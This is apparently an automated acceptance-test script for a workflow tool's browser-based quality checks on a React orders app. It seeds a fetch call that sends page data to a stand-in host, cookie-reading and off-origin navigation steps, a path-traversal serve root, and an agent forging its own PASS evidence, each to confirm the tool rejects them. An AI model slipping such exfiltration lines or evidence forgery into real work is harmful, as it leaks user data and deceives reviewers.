#!/usr/bin/env node
/**
 * Quality + real browser acceptance on the React orders-app (the developer's code from the manual alpha.49 E2E).
 * AUTOMATED. The app is bundled with esbuild, served by the Praxis browser driver on loopback, and driven in a real Chrome by
 * Quality through the packaged Runtime: 31 acceptance criteria, 4 Stories, one service. Checks: partial coverage is not PASS,
 * a seeded Escape bug is FAILED by the browser and cannot be laundered by an agent's own record, the fix is verified again and
 * every requirement goes PASS from independent browser evidence, evidence keeps its provenance and screenshot digests,
 * an unavailable browser is BLOCKED, hostile checks are refused, an app that reaches outside is FAILED.
 * Needs network once to install react / react-dom (npm cache afterwards). Usage: node tools/scripts/quality-browser-acceptance.mjs [--chrome <path>]
 */
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { cpSync, existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { build } from "esbuild";

const root = resolve(dirname(fileURLToPath(import.meta.url)), "../..");
const version = JSON.parse(readFileSync(join(root, "package.json"), "utf8")).version;
const chromePath = process.argv.includes("--chrome") ? process.argv[process.argv.indexOf("--chrome") + 1] : process.env.PRAXIS_BROWSER_EXECUTABLE || "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome";
if (!existsSync(chromePath)) {
  console.error(`no Chrome at ${chromePath}; pass --chrome <path>`);
  process.exit(2);
}
const built = spawnSync("npm run build --workspaces --if-present", { cwd: root, shell: true, encoding: "utf8" });
if ((built.status ?? 1) !== 0) {
  console.error(built.stderr || built.stdout);
  process.exit(1);
}
const { packClaudeExtension } = await import("./pack-claude-extension.mjs");
const { extractMcpbRuntime } = await import("./mcpb-runtime.mjs");
const { connectOfficialMcp, hostedCleanEnv, parseDoctorEnvelope, versionNegotiationLegacy } = await import("./official-mcp-client.mjs");
const dist = await packClaudeExtension(version);
const extracted = extractMcpbRuntime(dist.mcpbPath ?? join(root, "dist", "claude-extensions", version, "praxis-runtime.mcpb"), mkdtempSync(join(tmpdir(), "praxis-qb-")));

// ---- the project: the developer's React app + react/react-dom, bundled in three variants
const proj = mkdtempSync(join(tmpdir(), "praxis-qb-proj-"));
cpSync(join(root, "tools", "fixtures", "orders-react-app"), proj, { recursive: true });
const npm = spawnSync("npm", ["install", "--no-audit", "--no-fund", "--loglevel=error"], { cwd: proj, encoding: "utf8" });
if (npm.status !== 0) {
  console.error(`npm install of react failed (network?):\n${npm.stderr}`);
  process.exit(2);
}
async function bundle(outDir, { slim = true, escapeBug = false, leak = false } = {}) {
  rmSync(join(proj, outDir), { recursive: true, force: true });
  mkdirSync(join(proj, outDir), { recursive: true });
  await build({
    entryPoints: [join(proj, "src", "main.jsx")],
    bundle: true,
    outfile: join(proj, outDir, "app.js"),
    jsx: "automatic",
    loader: { ".js": "jsx", ".jsx": "jsx", ".css": "empty" },
    define: { "process.env.NODE_ENV": '"production"' },
    logLevel: "error",
    plugins: [
      {
        name: "variants",
        setup(b) {
          b.onLoad({ filter: /data[\\/]orders\.js$/ }, (a) => {
            let text = readFileSync(a.path, "utf8");
            // the empty-state criterion needs a status nobody has: the slim data has no Cancelled order
            if (slim) text = text.replace(/  \{ number: 'ORD-2005'[\s\S]*?\] \},\n/, "");
            return { contents: text, loader: "js" };
          });
          b.onLoad({ filter: /OrderDrawer\.jsx$/ }, (a) => {
            let text = readFileSync(a.path, "utf8");
            if (escapeBug) text = text.replace("if (e.key === 'Escape') onClose();", "/* seeded bug: Escape does nothing */");
            return { contents: text, loader: "jsx" };
          });
          b.onLoad({ filter: /main\.jsx$/ }, (a) => ({ contents: readFileSync(a.path, "utf8") + (leak ? "\nfetch('http://example.invalid/collect?d=' + document.title).catch(() => {});\n" : ""), loader: "jsx" }));
        },
      },
    ],
  });
  writeFileSync(join(proj, outDir, "index.html"), readFileSync(join(proj, "index.html"), "utf8"));
  writeFileSync(join(proj, outDir, "app.css"), readFileSync(join(proj, "src", "styles", "theme.css"), "utf8"));
}

const results = [];
let cur = { checks: 0 };
const check = (cond, msg) => {
  if (!cond) throw new Error(msg);
  cur.checks += 1;
};
const eq = (a, b, msg) => check(JSON.stringify(a) === JSON.stringify(b), `${msg}: expected ${JSON.stringify(b)}, got ${JSON.stringify(a)}`);
async function scenario(id, title, fn) {
  cur = { id, title, checks: 0, status: "PASS", error: null };
  try {
    await fn();
  } catch (e) {
    cur.status = "FAIL";
    cur.error = String(e.message ?? e).slice(0, 900);
  }
  results.push(cur);
  console.error(`${cur.status === "PASS" ? "  ok  " : "  FAIL"} ${id} ${title}${cur.error ? `\n        ${cur.error}` : ` (${cur.checks} checks)`}`);
}

const serverEnv = (extra = {}) => ({ ...hostedCleanEnv(extracted.dest), PATH: `${dirname(process.execPath)}:/usr/bin:/bin:/usr/local/bin`, PRAXIS_SKIP_DOTENV: "1", PRAXIS_TEST_REVIEW_NO_BROWSER: "1", PRAXIS_BROWSER_EXECUTABLE: chromePath, PRAXIS_PLAYWRIGHT_DIR: root, ...extra });
async function open(env) {
  return connectOfficialMcp({ command: process.execPath, args: extracted.args, cwd: extracted.dest, env, versionNegotiation: versionNegotiationLegacy(), elicit: async () => ({ action: "accept", content: { decision: "approve" } }), timeoutMs: 300_000, clientVersion: version });
}
const call = async (s, name, args) => parseDoctorEnvelope(await s.client.callTool({ name, arguments: args })) ?? { ok: false, code: "NO_ENVELOPE" };
const agent = await open(serverEnv());
const stateOf = (id) => JSON.parse(readFileSync(join(proj, ".praxis", "workflow", "items", `${id}.json`), "utf8"));
async function must(command, wi, session = agent) {
  const extra = wi ? { workItemId: wi } : {};
  const p = await call(session, "praxis_workflow_preview", { repo: proj, command: JSON.stringify(command), ...extra });
  if (!p.ok) throw new Error(`${command.action} preview: ${p.code} ${JSON.stringify(p.errors)}`);
  const a = await call(session, "praxis_workflow_apply", { repo: proj, command: JSON.stringify(command), confirmation: "YES", previewFingerprint: p.data.fingerprint, ...extra });
  if (!a.ok) throw new Error(`${command.action}: ${a.code} ${JSON.stringify(a.errors)}`);
  return a;
}
async function tryApply(command, wi, session = agent) {
  const extra = { workItemId: wi };
  const p = await call(session, "praxis_workflow_preview", { repo: proj, command: JSON.stringify(command), ...extra });
  if (!p.ok) return p;
  return call(session, "praxis_workflow_apply", { repo: proj, command: JSON.stringify(command), confirmation: "YES", previewFingerprint: p.data.fingerprint, ...extra });
}

// ---- the work item: 5 requirements, 31 criteria, 4 Stories, one service
const COUNTS = { "REQ-ORD-001": 7, "REQ-ORD-002": 9, "REQ-ORD-003": 2, "REQ-ORD-004": 6, "REQ-ORD-005": 7 };
const STORIES = [
  ["US-ORD-001", ["REQ-ORD-005"], "see the order data", "orders carry the fields the card needs"],
  ["US-ORD-002", ["REQ-ORD-001"], "filter orders by status", "I find the orders I need"],
  ["US-ORD-003", ["REQ-ORD-002", "REQ-ORD-003"], "open an order beside the list", "I keep the context"],
  ["US-ORD-004", ["REQ-ORD-004"], "share the filtered view by link", "colleagues see the same thing"],
];
const acIds = (req) => Array.from({ length: COUNTS[req] }, (_, i) => `${req}-AC-${String(i + 1).padStart(2, "0")}`);
const wi = (await must({ action: "open", projectId: "orders", title: "Orders filter", request: "Filter orders by status with a side card", mode: "classic" })).data.workItemId;
for (const req of Object.keys(COUNTS)) await must({ action: "add-requirement", id: req, statement: `Requirement ${req}`, acceptanceCriteria: acIds(req).map((id) => `Criterion ${id}`), serviceIds: ["svc-web"] }, wi);
for (const [id, reqs, capability, value] of STORIES)
  await must({ action: "add-story", id, requirementIds: reqs, actor: "manager", narrative: `As a manager, I want to ${capability}, so that ${value}.`, objective: capability, userValue: value, happyPath: ["do it"], acceptanceCriteria: reqs.flatMap(acIds).map((c) => ({ id: c, given: "the orders page", when: "the manager acts", then: "the criterion holds" })), expectedResults: ["done"], serviceIds: ["svc-web"], confirmedBehavior: false }, wi);
await must({ action: "set-service", service: { id: "svc-web", name: "Orders web", kind: "frontend", localPath: proj, responsibilities: ["orders page"], requirementIds: Object.keys(COUNTS), dependsOn: [], status: "in_progress" } }, wi);
await must({ action: "record-implementation", id: "IMPL-ORD-001", serviceId: "svc-web", requirementIds: Object.keys(COUNTS), path: "src/pages/OrdersPage.jsx", summary: "filter, side card, URL state" }, wi);
const inspected = (await call(agent, "praxis_workflow_inspect", { repo: proj, workItemId: wi, view: "stories" })).data;
for (const story of inspected.stories) {
  const command = { action: "confirm-story", id: story.id, revision: story.revision, contentFingerprint: story.contentFingerprint };
  await must(command, wi);
}

// ---- the 31 browser checks
const ROW = (n) => `tr:has-text('${n}')`;
const AS = "aside.drawer";
const owner = { "REQ-ORD-001": "US-ORD-002", "REQ-ORD-002": "US-ORD-003", "REQ-ORD-003": "US-ORD-003", "REQ-ORD-004": "US-ORD-004", "REQ-ORD-005": "US-ORD-001" };
const rows = (n) => ({ expectCount: { selector: ".orders-main tbody tr", equals: n } });
const has = (selector, contains) => ({ expectText: { selector, contains } });
const lacks = (selector, notContains) => ({ expectText: { selector, notContains } });
const STEPS = {
  "REQ-ORD-001-AC-01": [{ goto: "/" }, { expectCount: { selector: "select option", equals: 6 } }, ...["Cancelled", "New", "In progress", "Shipped", "Delivered"].map((s) => has("select", s))],
  "REQ-ORD-001-AC-02": [{ goto: "/" }, { expectValue: { selector: "select", equals: "" } }, rows(7), { expectUrl: { path: "/", absent: ["status"] } }],
  "REQ-ORD-001-AC-03": [{ goto: "/" }, { expectCount: { selector: "select[multiple]", equals: 0 } }, { select: { selector: "select", value: "Shipped" } }, { expectValue: { selector: "select", equals: "Shipped" } }],
  "REQ-ORD-001-AC-04": [{ goto: "/" }, { select: { selector: "select", value: "New" } }, rows(2), lacks(".orders-main tbody", "Globex")],
  "REQ-ORD-001-AC-05": [{ goto: "/" }, { select: { selector: "select", value: "Shipped" } }, rows(1), { select: { selector: "select", value: "" } }, rows(7)],
  "REQ-ORD-001-AC-06": [{ goto: "/?status=Cancelled" }, has("p.empty", "Нет заказов со статусом Cancelled"), { click: "p.empty button" }, { expectValue: { selector: "select", equals: "" } }, rows(7)],
  "REQ-ORD-001-AC-07": [{ goto: "/" }, has("thead", "Number"), has("thead", "Customer"), has("thead", "Status"), has(".orders-main tbody", "Acme Corp"), has(".orders-main tbody", "Legacy Trading")],
  "REQ-ORD-002-AC-01": [{ goto: "/" }, { click: ROW("ORD-2002") }, { expectVisible: AS }, { expectCount: { selector: "tr.selected", equals: 1 } }],
  "REQ-ORD-002-AC-02": [{ goto: "/" }, { click: ROW("ORD-2003") }, { expectVisible: AS }, { expectVisible: "select" }, { select: { selector: "select", value: "Shipped" } }, rows(1), { expectVisible: AS }],
  "REQ-ORD-002-AC-03": [{ goto: "/" }, { click: ROW("ORD-2002") }, ...["ORD-2002", "Globex", "In progress", "2026-10-02", "450"].map((t) => has(AS, t))],
  "REQ-ORD-002-AC-04": [{ goto: "/" }, { click: ROW("ORD-2002") }, ...["Gizmo", "150"].map((t) => has(AS, t))],
  "REQ-ORD-002-AC-05": [{ goto: "/" }, { click: ROW("ORD-2002") }, ...["ops@globex.test", "+1 555 0102", "5 Elm Ave"].map((t) => has(AS, t))],
  "REQ-ORD-002-AC-06": [{ goto: "/" }, { click: ROW("ORD-2002") }, has(AS, "In progress"), lacks(AS, "History"), lacks(AS, "История")],
  "REQ-ORD-002-AC-07": [{ goto: "/?order=ORD-1990" }, has(AS, "Legacy Trading"), has(AS, "—")],
  "REQ-ORD-002-AC-08": [{ goto: "/" }, { click: ROW("ORD-2002") }, { click: ROW("ORD-2004") }, has(AS, "Umbrella"), lacks(AS, "Globex")],
  "REQ-ORD-002-AC-09": [{ goto: "/" }, { click: ROW("ORD-2002") }, { click: "button[aria-label=Close]" }, { expectHidden: AS }, { expectCount: { selector: "tr.selected", equals: 0 } }, { click: ROW("ORD-2002") }, { press: "Escape" }, { expectHidden: AS }, { expectCount: { selector: "tr.selected", equals: 0 } }],
  "REQ-ORD-003-AC-01": [{ goto: "/" }, { click: ROW("ORD-2002") }, { select: { selector: "select", value: "Shipped" } }, { expectHidden: AS }, { expectCount: { selector: "tr.selected", equals: 0 } }],
  "REQ-ORD-003-AC-02": [{ goto: "/" }, { select: { selector: "select", value: "In progress" } }, { click: ROW("ORD-2002") }, { select: { selector: "select", value: "" } }, { expectVisible: AS }, has(AS, "ORD-2002"), { expectCount: { selector: "tr.selected", equals: 1 } }],
  "REQ-ORD-004-AC-01": [{ goto: "/" }, { select: { selector: "select", value: "In progress" } }, { expectUrl: { query: { status: "In progress" } } }, { select: { selector: "select", value: "" } }, { expectUrl: { absent: ["status"] } }],
  "REQ-ORD-004-AC-02": [{ goto: "/" }, { click: ROW("ORD-2002") }, { expectUrl: { query: { order: "ORD-2002" } } }, { click: "button[aria-label=Close]" }, { expectUrl: { absent: ["order"] } }],
  "REQ-ORD-004-AC-03": [{ goto: "/?status=Shipped&order=ORD-2003" }, { expectValue: { selector: "select", equals: "Shipped" } }, { expectVisible: AS }, has(AS, "Initech")],
  "REQ-ORD-004-AC-04": [{ goto: "/?status=Shipped&order=ORD-2003" }, { reload: true }, { expectValue: { selector: "select", equals: "Shipped" } }, { expectVisible: AS }, has(AS, "Initech")],
  "REQ-ORD-004-AC-05": [{ goto: "/?status=Bogus" }, { expectValue: { selector: "select", equals: "" } }, rows(7)],
  "REQ-ORD-004-AC-06": [{ goto: "/?status=Shipped&order=NOPE" }, { expectHidden: AS }, { expectUrl: { query: { status: "Shipped" }, absent: ["order"] } }, { expectValue: { selector: "select", equals: "Shipped" } }, rows(1), { goto: "/?status=New&order=ORD-2003" }, { expectHidden: AS }, { expectUrl: { query: { status: "New" }, absent: ["order"] } }],
  "REQ-ORD-005-AC-01": [{ goto: "/" }, ...["New", "In progress", "Shipped", "Delivered", "Cancelled"].map((s) => has("select", s))],
  "REQ-ORD-005-AC-02": [{ goto: "/?order=ORD-2001" }, has(AS, "2026-10-01"), has(AS, "1200")],
  "REQ-ORD-005-AC-03": [{ goto: "/?order=ORD-2001" }, has(AS, "Widget"), has(AS, "Gadget")],
  "REQ-ORD-005-AC-04": [{ goto: "/?order=ORD-2001" }, has(AS, "buyer@acme.test"), has(AS, "+1 555 0101"), has(AS, "1 Main St")],
  "REQ-ORD-005-AC-05": [{ goto: "/?order=ORD-2001" }, has(AS, "New"), lacks(AS, "History")],
  "REQ-ORD-005-AC-06": [{ goto: "/" }, has("thead", "Number"), has("thead", "Customer"), has("thead", "Status"), { expectCount: { selector: ROW("ORD-2001"), equals: 1 } }],
  "REQ-ORD-005-AC-07": [{ goto: "/?order=ORD-1990" }, has(AS, "Legacy Trading"), rows(7)],
};
const checkFor = (ac, extra = {}) => {
  const req = ac.replace(/-AC-\d+$/, "");
  return { scenarioId: `B-${ac}`, storyId: owner[req], requirementId: req, acceptanceCriterionId: ac, kind: "happy", level: "browser", serviceId: "svc-web", steps: STEPS[ac], ...extra };
};
const allAcs = Object.keys(COUNTS).flatMap(acIds);
eq(allAcs.length, 31, "the work item has 31 acceptance criteria");
const writeChecks = (acs, browser = { serve: { root: "dist", spa: true } }) => {
  mkdirSync(join(proj, ".praxis", "quality", wi), { recursive: true });
  writeFileSync(join(proj, ".praxis", "quality", wi, "checks.json"), JSON.stringify({ browser, checks: acs.map((a) => checkFor(a)) }, null, 1));
};
const verify = (rerun) => must({ action: "verify-stories", independentRerun: rerun }, wi);
const coverageOf = (id) => stateOf(wi).coverage.find((e) => e.scenarioId === id);
const reqVerdict = (req) => stateOf(wi).verdicts.filter((v) => v.scope === "requirement" && v.scopeId === req).at(-1);
const sha = (file) => createHash("sha256").update(readFileSync(file)).digest("hex");

await scenario("Q01", "Partial browser coverage (REQ-ORD-001 only) is not PASS: counts say 7 of 31, the other requirements have no evidence", async () => {
  await bundle("dist", { slim: true });
  writeChecks(acIds("REQ-ORD-001"));
  const r = (await verify(true)).data.result;
  eq(r.verdict, "FAIL", "feature verdict");
  eq([r.coverage.totals.total, r.coverage.totals.passed, r.coverage.totals.missing], [31, 7, 24], "criteria totals");
  eq(r.coverage.requirements.find((x) => x.id === "REQ-ORD-001").verdict, "PASS", "the fully proven requirement");
  check(r.coverage.requirements.filter((x) => x.id !== "REQ-ORD-001").every((x) => x.verdict === "FAIL"), "every unproven requirement is FAIL, none is PASS");
  const e = coverageOf("B-REQ-ORD-001-AC-04");
  eq([e.status, e.source.kind], ["PASS", "browser"], "a check that ran in the browser is browser evidence");
  check(e.evidence.some((l) => l.startsWith("runner:playwright-chromium")) && e.evidence.some((l) => l.startsWith("bundle:")), "the entry names the runner and the bundle");
  check(e.source.artifacts.length === 1 && existsSync(join(proj, e.source.artifacts[0].path)), "a screenshot was stored");
  eq(sha(join(proj, e.source.artifacts[0].path)), e.source.artifacts[0].sha256, "the stored screenshot has the digest recorded");
});

await scenario("Q02", "A seeded Escape bug: the browser FAILS the criterion, the Developer gets a finding, an agent's own PASS cannot launder it", async () => {
  await bundle("dist", { slim: true, escapeBug: true });
  writeChecks(allAcs);
  const r = (await verify(false)).data.result;
  eq(r.verdict, "FAIL", "feature verdict");
  const failedEntries = stateOf(wi).coverage.filter((e) => e.status === "FAIL");
  eq(failedEntries.map((e) => e.acceptanceCriterionId), ["REQ-ORD-002-AC-09"], `only the Escape criterion fails (${JSON.stringify(failedEntries.map((e) => e.evidence))})`);
  check(stateOf(wi).findings.some((f) => f.owner === "developer" && f.status === "open" && f.acceptanceCriterionIds?.includes("REQ-ORD-002-AC-09")), "the finding names the criterion and goes to the Developer");
  eq(reqVerdict("REQ-ORD-002").verdict, "FAIL", "REQ-ORD-002 is FAIL");
  eq(reqVerdict("REQ-ORD-001").verdict, "PASS", "REQ-ORD-001 is PASS");
  // the agent writes its own PASS for the failing criterion, with a new id and then with the same id
  await must({ action: "record-verification", independentRerun: true, scenarios: [{ storyId: "US-ORD-003", requirementId: "REQ-ORD-002", acceptanceCriterionId: "REQ-ORD-002-AC-09", scenarioId: "AGENT-ESC", kind: "happy", serviceId: "svc-web", status: "PASS", critical: true, evidence: ["I pressed Escape and it closed"], source: { kind: "browser", runId: "run-forged", artifacts: [] } }], findings: [] }, wi);
  eq(coverageOf("AGENT-ESC").source.kind, "agent", "the agent's record is stored as agent-attested whatever it claims");
  eq(reqVerdict("REQ-ORD-002").verdict, "FAIL", "REQ-ORD-002 stays FAIL: a failing independent result is not outweighed by an attestation");
  const overwrite = await tryApply({ action: "record-verification", independentRerun: true, scenarios: [{ storyId: "US-ORD-003", requirementId: "REQ-ORD-002", acceptanceCriterionId: "REQ-ORD-002-AC-09", scenarioId: "B-REQ-ORD-002-AC-09", kind: "happy", serviceId: "svc-web", status: "PASS", critical: true, evidence: ["trust me"] }], findings: [] }, wi);
  check(!overwrite.ok && /cannot overwrite|EVIDENCE_PROTECTED/.test(JSON.stringify(overwrite)), `an agent cannot overwrite the browser result: ${overwrite.code}`);
  eq(coverageOf("B-REQ-ORD-002-AC-09").status, "FAIL", "the browser result stands");
  const shots = readdirSync(join(proj, ".praxis", "quality", wi, "artifacts"));
  check(shots.length >= 2, "each run keeps its own artifacts directory");
});

await scenario("Q03", "The Developer fixes it and the checks are verified again: 31 of 31 from browser evidence, same scenario ids, new bundle digest, every verdict agrees", async () => {
  const before = coverageOf("B-REQ-ORD-001-AC-04").source.subjectDigest;
  const revisionBefore = stateOf(wi).coverageRevision;
  await bundle("dist", { slim: true });
  const r = (await verify(true)).data.result;
  eq([r.verdict, r.coverage.totals.passed, r.coverage.totals.total], ["PASS", 31, 31], "evidence verdict and totals");
  for (const req of Object.keys(COUNTS)) eq(reqVerdict(req).verdict, "PASS", `${req} verdict`);
  check(coverageOf("B-REQ-ORD-002-AC-09").status === "PASS", "the criterion that failed is PASS now, under the same scenario id");
  check(coverageOf("B-REQ-ORD-001-AC-04").source.subjectDigest !== before, "the bundle digest changed with the fix");
  check(stateOf(wi).coverageRevision > revisionBefore, "coverage revision advanced");
  check(coverageOf("AGENT-ESC")?.source.kind === "agent" || coverageOf("AGENT-ESC") === undefined, "the agent attestation is not promoted");
  // one model: feature-verdict computes the same evidence verdict, readiness is the only difference
  const fv = await call(agent, "praxis_workflow_preview", { repo: proj, workItemId: wi, command: JSON.stringify({ action: "feature-verdict" }) });
  eq(fv.data.result.evidence.verdict, "PASS", "feature-verdict agrees about the evidence");
  const stories = fv.data.result.evidence.stories;
  check(stories.length === 4 && stories.every((s) => s.verdict === "PASS" && s.counts.missing === 0), `all 4 Stories are PASS: ${JSON.stringify(stories.map((s) => s.verdict))}`);
});

await scenario("Q04", "A change after the verdict makes the evidence stale: a revised criterion is not proven by the older result", async () => {
  const state = stateOf(wi);
  const ac = state.requirements.find((r) => r.id === "REQ-ORD-003").acceptanceCriteria[0];
  const f = await call(agent, "praxis_workflow_preview", { repo: proj, workItemId: wi, command: JSON.stringify({ action: "revise-acceptance", edits: [{ id: ac.id, statement: "When the filter changes and the open order is no longer listed, the card closes and the row is deselected.", expectedRevision: ac.revision }] }) });
  // a rewording is the user's act: the preview shows it awaits approval, and nothing is written by previewing
  check(f.ok && f.data.result.awaitingUserApproval, `the rewording awaits the user: ${JSON.stringify(f.errors ?? f.data.result)}`);
  const a = await call(agent, "praxis_workflow_apply", { repo: proj, workItemId: wi, command: JSON.stringify({ action: "revise-acceptance", edits: [{ id: ac.id, statement: "When the filter changes and the open order is no longer listed, the card closes and the row is deselected.", expectedRevision: ac.revision }] }), confirmation: "YES", previewFingerprint: f.data.fingerprint });
  check(a.ok, `rewording applied after the user's approval: ${JSON.stringify(a.errors)}`);
  const fv = await call(agent, "praxis_workflow_preview", { repo: proj, workItemId: wi, command: JSON.stringify({ action: "feature-verdict" }) });
  const ev = fv.data.result.evidence;
  eq(ev.verdict, "FAIL", "the reworded criterion needs a new result");
  check(ev.gaps.join("\n").includes("REQ-ORD-003-AC-01") && /older revision/.test(ev.gaps.join("\n")), `the gap names the criterion and says the result is for an older revision: ${ev.gaps.join(" | ")}`);
  await verify(true);
  const again = await call(agent, "praxis_workflow_preview", { repo: proj, workItemId: wi, command: JSON.stringify({ action: "feature-verdict" }) });
  eq(again.data.result.evidence.verdict, "PASS_WITH_RISKS", "all criteria are proven again, but the reworded Story is no longer confirmed");
  check(again.data.result.evidence.gaps.join("\n").includes("story-unconfirmed:US-ORD-003@"), "the gap says the Story needs the user's confirmation again");
  const story = (await call(agent, "praxis_workflow_inspect", { repo: proj, workItemId: wi, view: "stories" })).data.stories.find((x) => x.id === "US-ORD-003");
  await must({ action: "confirm-story", id: story.id, revision: story.revision, contentFingerprint: story.contentFingerprint }, wi);
  const final = await call(agent, "praxis_workflow_preview", { repo: proj, workItemId: wi, command: JSON.stringify({ action: "feature-verdict" }) });
  eq(final.data.result.evidence.verdict, "PASS", "after the user confirms the reworded Story the evidence is PASS");
});

await scenario("Q05", "No browser available: every browser check is BLOCKED with the reason, nothing is passed, previous evidence is not silently reused as new", async () => {
  const blind = await open(serverEnv({ PRAXIS_BROWSER_EXECUTABLE: "/nonexistent/chrome", PRAXIS_PLAYWRIGHT_DIR: join(proj, "no-such-dir") }));
  try {
    const r = (await must({ action: "verify-stories", independentRerun: true }, wi, blind)).data.result;
    eq(r.verdict, "FAIL", "feature verdict without a browser");
    const e = coverageOf("B-REQ-ORD-001-AC-04");
    eq([e.status, e.source.kind], ["BLOCKED", "browser"], "the entry is BLOCKED");
    check(e.evidence.some((l) => /browser run unavailable/.test(l)), "and says why");
    check(!reqVerdict("REQ-ORD-001") || reqVerdict("REQ-ORD-001").verdict !== "PASS", "REQ-ORD-001 is no longer PASS on a run that proved nothing");
  } finally {
    await blind.client.close?.();
  }
  const r = (await verify(true)).data.result;
  eq(r.verdict, "PASS", "with the browser back the same checks prove it again");
});

await scenario("Q06", "Hostile checks are refused as data, an app that reaches outside is FAILED, a check outside the served root cannot read files", async () => {
  const bad = (steps) => {
    mkdirSync(join(proj, ".praxis", "quality", wi), { recursive: true });
    writeFileSync(join(proj, ".praxis", "quality", wi, "checks.json"), JSON.stringify({ browser: { serve: { root: "dist" } }, checks: [{ ...checkFor("REQ-ORD-001-AC-04"), steps }] }));
  };
  for (const [name, steps] of [["evaluate", [{ evaluate: "document.cookie" }]], ["absolute goto", [{ goto: "http://example.com/" }]], ["protocol-relative goto", [{ goto: "//example.com/" }]], ["two keys in a step", [{ goto: "/", click: "a" }]], ["empty", []]]) {
    bad(steps);
    const p = await call(agent, "praxis_workflow_preview", { repo: proj, workItemId: wi, command: JSON.stringify({ action: "verify-stories", independentRerun: true }) });
    check(!p.ok && /CHECKS_INVALID/.test(JSON.stringify(p)), `${name} is refused before anything runs: ${JSON.stringify(p.errors ?? p.code).slice(0, 160)}`);
  }
  mkdirSync(join(proj, ".praxis", "quality", wi), { recursive: true });
  writeFileSync(join(proj, ".praxis", "quality", wi, "checks.json"), JSON.stringify({ browser: { serve: { root: "../outside" } }, checks: [checkFor("REQ-ORD-001-AC-04")] }));
  const outside = await call(agent, "praxis_workflow_preview", { repo: proj, workItemId: wi, command: JSON.stringify({ action: "verify-stories", independentRerun: true }) });
  const outEntry = outside.ok ? outside.data.result.scenarios?.find((s) => s.scenarioId === "B-REQ-ORD-001-AC-04") : null;
  check(outEntry?.status === "BLOCKED" && outEntry.evidence.some((l) => /outside the service directory|missing/.test(l)), `a serve root outside the project is BLOCKED: ${JSON.stringify(outEntry?.evidence)}`);
  await bundle("dist-leak", { slim: true, leak: true });
  writeChecks(["REQ-ORD-001-AC-04"], { serve: { root: "dist-leak" } });
  await verify(true);
  const e = coverageOf("B-REQ-ORD-001-AC-04");
  eq(e.status, "FAIL", "an app that tries to reach example.invalid fails the check");
  check(e.evidence.some((l) => /outside the served origin/.test(l)), "and the evidence says so");
});

await scenario("Q07", "Real work-item reality: the lab's Quality state and a re-read of persisted state still parse (old entries without provenance count only for unrevised criteria)", async () => {
  writeChecks(allAcs);
  await verify(true);
  const state = stateOf(wi);
  const legacy = { ...state, coverage: state.coverage.map(({ source, recordedAt, acceptanceCriterionRevision, ...rest }) => rest), coverageRevision: undefined };
  const copy = mkdtempSync(join(tmpdir(), "praxis-qb-legacy-"));
  mkdirSync(join(copy, ".praxis", "workflow", "items"), { recursive: true });
  const layout = JSON.parse(readFileSync(join(proj, ".praxis", "workflow", "index.json"), "utf8"));
  writeFileSync(join(copy, ".praxis", "workflow", "index.json"), JSON.stringify(layout));
  writeFileSync(join(copy, ".praxis", "workflow", "items", `${wi}.json`), JSON.stringify(legacy));
  const s = await call(agent, "praxis_workflow_inspect", { repo: copy, workItemId: wi, view: "quality" });
  check(s.ok, `a state saved before provenance existed is read: ${JSON.stringify(s.errors)}`);
  const evs = s.data.quality.requirementEvidence;
  eq(evs.map((x) => `${x.requirementId}:${x.status}:${x.verdict}`).sort(), ["REQ-ORD-001:executed:PASS", "REQ-ORD-002:executed:PASS", "REQ-ORD-003:executed:FAIL", "REQ-ORD-004:executed:PASS", "REQ-ORD-005:executed:PASS"], "legacy results still prove the unrevised criteria; the criterion revised since (REQ-ORD-003-AC-01) is stale and holds its requirement back");
});

await agent.client.close?.();
const failed = results.filter((r) => r.status !== "PASS");
mkdirSync(join(root, "dist"), { recursive: true });
writeFileSync(join(root, "dist", "quality-browser-report.json"), `${JSON.stringify({ generatedAt: new Date().toISOString(), automated: true, browser: chromePath, scenarios: results }, null, 2)}\n`);
console.error(`\n${results.length - failed.length}/${results.length} Quality browser scenarios passed (automated, real Chrome + React app); ${results.reduce((n, r) => n + r.checks, 0)} checks`);
process.exit(failed.length ? 1 : 0);
